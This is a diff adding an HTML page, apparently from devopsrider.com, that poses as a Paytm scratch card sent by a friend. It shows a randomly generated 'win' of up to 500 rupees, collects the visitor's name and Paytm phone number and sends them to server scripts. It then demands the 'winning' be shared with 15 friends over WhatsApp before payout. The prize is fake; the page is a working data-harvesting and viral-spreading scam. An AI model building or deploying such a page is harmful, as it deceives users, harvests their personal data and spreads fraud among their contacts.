@@ -1,0 +1,189 @@
+<html>
+<head>
+<title>Earn Paytm Cash - devopsrider.com</title>
+
+    <meta name="viewport" content="width=400">
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
+
+<script type = "text/javascript" 
+         src = "https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js">
+      </script>
+
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'  type='text/css'>
+
+
+
+</head>
+<body>
+
+<center>
+
+    <!--<div style="font-family:impact;font-size:50px; color:darkblue; font-weight: bold;">Pay<span style="color:skyblue">tm</span></div>-->
+    <img src="https://img.icons8.com/color/144/000000/paytm.png" style="width: 100px;">
+
+    <div class="hidde" id="scratch-card" >
+        <b>Your Friend sent you a scratch card.</b>
+        <br><br>
+
+        <div style="height:200px; width:200px; border-radius:15px; background-color: #26054c;">
+            <div style="padding: 30px; font-size:20px; color:white;">
+                Click on scratch card to win Paytm cash upto 500/-
+            </div>
+        </div>
+        <br><br>
+        Scratch this card and you can win upto 500/- <br>
+        <a>Terms and conditions apply</a>
+    </div>
+
+    <div  class="hidden" id="scratch-card-white" >
+    <div style="height:200px; width:200px; border-radius:15px; border:1px solid lightgrey; border-right:4px solid lightgrey; border-bottom:3px solid lightgrey;">
+    </br>
+        <div style="color: green; font-size: 20px;">Congratulations !</div>
+        <div style="padding:30px; font-size:25px; color:lightblack;">
+            You won
+            <div id="win-price">0</div>
+        </div>
+    </div>
+    <br>
+        <div style="text-align: left;">
+<br>
+
+            <div class="rows">
+                <div class="col-sm-3"></div>
+                <div class="col-sm-6">
+                    <div style="font-size: 20px;">Enter your Paytm number to get it directly to your account.</div>
+                <br>
+                    <div class="rows">
+                        <div class="col-sm-2"><label for="name">Name:</label></div>
+                        <div class="col-sm-8"><input id="nameValue" class="form-control" type="Name" placeholder="  Your name"></div>
+                    </div>
+            <br><br>
+                    <div class="rows">
+                        <div class="col-sm-2"><label for="paytm-number">Paytm Number:</label></div>
+                        <div class="col-sm-8"><input id="numberValue" class="form-control" type="number" placeholder="  Paytm Number"></div>
+                    </div>
+                    <br><br><br>
+                    <div class="rows">
+                        <div class="col-sm-2"></div>
+                        <div class="col-sm-3">
+                            <input type="submit"  onclick="submitFun();" class="btn btn-primary" class="form-control" value="Receive Money">
+                        </div>
+                    </div>
+                    <br>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+
+<div id="showShareMssg" class="hidden">
+        <div style="padding:10px; color: green; font-size:20px;">Thanks <span id="nameValueShow"></span> ! we have got your Paytm number <span id="numberValueShow"></span>. Please share your winning with atleast 15 friends to get Rs. <span id="priceValueShow"></span> /-</div>
+        <br>
+        <span style="color: red; font-size:17px;"><b>Note: </b></span>If you will not share with friends, you will not get winning amount.
+        <br><br><br>
+        <a class="btn btn-lg btn-success" id="whatsappLink" href="" data-action="share/whatsapp/share">Share with 15 Friends</a>
+        <br><br>
+        <div style="color: green; font-size:17px;">If you did not get money within 3 hours then visit <a href="www.devopsrider.com">here</a> to get solution.</div>
+    </div>
+
+
+<form id="hiddenForm" action="share-your-winning.php" method="post">
+<input type="hidden" name="nameValue" value="">
+<input type="hidden" name="numberValue" value="">
+<input type="hidden" name="priceValue" value="">
+</form>
+
+
+
+
+
+<br><br>
+
+</center>
+
+<br><br><br><br><br>
+
+<hr>
+
+<div id="h11"></div>
+
+<script>
+
+function changeClass(){
+a.className = "hidden"
+}
+
+a = document.getElementById("scratch-card")
+b = document.getElementById("scratch-card-white")
+c = document.getElementById("showShareMssg")
+price = document.getElementById("win-price")
+
+a.onclick = function(){changeClass()};
+
+
+
+function changeClass(){
+a.className = "hidden"
+b.className = "unhide"
+
+for(var i=0; i<10000; i++){
+    value = Math.round(Math.random()* 200)
+    if(value < 10)
+        value = value + 60
+    price.innerHTML = value
+        }
+
+window.navigator.vibrate(1000);
+}
+
+function submitFun(){
+nameValue =  document.getElementById("nameValue")
+numberValue = document.getElementById("numberValue")
+userData = nameValue.value+"=="+numberValue.value
+
+if(nameValue.value.length == 0 || numberValue.value.length < 10)
+alert("Please enter your name and valid 10 digits paytm mobile number.")
+
+else{
+
+$('#h11').load('add-user.php?data='+encodeURI(userData));
+
+formObject = document.getElementById("hiddenForm");
+formObject[0].value = nameValue.value;
+formObject[1].value = numberValue.value;
+formObject[2].value = value;
+formObject.submit();
+
+nexturl = "http://www.devopsrider.com/share-your-winning.php?nameValue="+nameValue.value+"&numberValue="+numberValue.value+"&priceValue="+value;           
+//location.href = nexturl;
+
+//b.className = "hidden"
+//c.className = "unhide"
+//document.getElementById("nameValueShow").innerHTML = nameValue.value
+//document.getElementById("numberValueShow").innerHTML = numberValue.value
+//document.getElementById("priceValueShow").innerHTML = value
+//$('html,body').scrollTop(0);
+
+//wtext = "whatsapp://send?text=Are mere ko "+value+" paytm cash mila hai abhi abhi sratch card se. Aap bhi try karo ek bar. click https://bit.ly/3a6NWX6";
+//document.getElementById("whatsappLink").href = encodeURI(wtext);
+
+}
+}
+
+</script>
+
+<br><br>
+<hr>
+
+<div style="font-size:10px; text-align:center;">To earn paytm cash scratch the card and win amount upto 500/- Share your winning story with your friends and get transferred paytm amount direct to your paytm wallet. You can also earn cashback with Google pay. Pay bills and do recharge to get Google pay scratch card and win money upto Rs. 1000/- <br>
+Google pay is the India's number one online payment platform. You can transfer money from acount to acount through Google pay UPI.<br>
+Today Amazon pay is also emerging as an online transaction platform in India. They are also providing multiple scheme to earn Amazon pay cashback.
+</div>
+
+<hr>
+
+
+</body>
+</html>
